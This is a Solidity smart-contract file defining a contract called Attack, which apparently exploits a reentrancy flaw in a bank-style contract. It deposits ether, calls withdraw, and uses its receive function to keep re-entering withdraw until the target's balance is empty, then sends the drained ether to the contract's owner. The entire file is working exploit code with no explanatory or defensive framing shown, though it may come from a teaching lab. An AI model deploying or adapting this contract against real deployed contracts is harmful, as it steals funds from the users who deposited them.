// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank  {
    function deposit() external payable;
    function withdraw() external;
}

contract Attack is Ownable {
    IBank public immutable _bank;

    constructor (address bank) {
        _bank = IBank(bank);
    }
  
    function attack() external payable onlyOwner {
         _bank.deposit{ value: msg.value } ();
        _bank.withdraw();
    }

    receive () external payable {
        if(address(_bank).balance > 0) {
            _bank.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }  
}